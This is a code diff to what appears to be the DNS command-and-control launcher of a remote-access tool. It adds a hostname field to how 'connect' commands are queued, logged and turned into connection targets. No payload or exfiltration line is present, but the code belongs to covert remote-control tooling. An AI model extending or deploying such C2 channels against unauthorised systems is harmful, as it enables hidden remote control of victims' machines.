@@ -164,14 +164,18 @@ class DNSCommandClientLauncher(DnsCommandsClient):
         worker.daemon = True
         worker.start()
 
-    def on_connect(self, ip, port, transport, proxy):
-        logger.debug('connect request: %s:%s %s %s', ip, port, transport, proxy)
+    def on_connect(self, address, port, transport, proxy, hostname=None):
+        logger.debug(
+            'connect request: %s:%s %s %s%s',
+            address, port, transport, proxy, (' host=' + hostname) if hostname else ''
+        )
+
         with self.lock:
             if self.stream and not self.stream.closed:
                 logger.debug('ignoring connection request. stream = %s', self.stream)
                 return
 
-            self.commands.append(('connect', ip, port, transport, proxy))
+            self.commands.append(('connect', address, port, transport, proxy, hostname))
 
     def on_disconnect(self):
         logger.debug('disconnect request [stream=%s]', self.stream)
@@ -308,8 +312,10 @@ class DNSCncLauncher(BaseLauncher):
         return connection
 
     def connect_to_host(self, host_info, transport, proxies):
-        logger.info('connecting to %s:%d using transport %s ...',
-            host_info.host, host_info.port, transport)
+        logger.info('connecting to %s:%d (hostname=%s) using transport %s ...',
+            host_info.host, host_info.port, host_info.hostname,
+            transport
+        )
 
         transport_info = create_client_transport_info_for_addr(
             transport, host_info
@@ -352,7 +358,7 @@ class DNSCncLauncher(BaseLauncher):
         stream = None
         transport = None
 
-        _, host, port, transport, connection_proxy = command
+        _, host, port, transport, connection_proxy, hostname = command
 
         if connection_proxy is None:
             logger.debug('Connection proxy: autodetect')
@@ -365,7 +371,8 @@ class DNSCncLauncher(BaseLauncher):
         else:
             logger.debug('Connection proxy: chain: %s', connection_proxy)
 
-        host_info = HostInfo(host, port)
+        host_info = HostInfo(host, port, hostname)
+
         streams_iterator = self.connect_to_host(
             host_info, transport, connection_proxy)
 
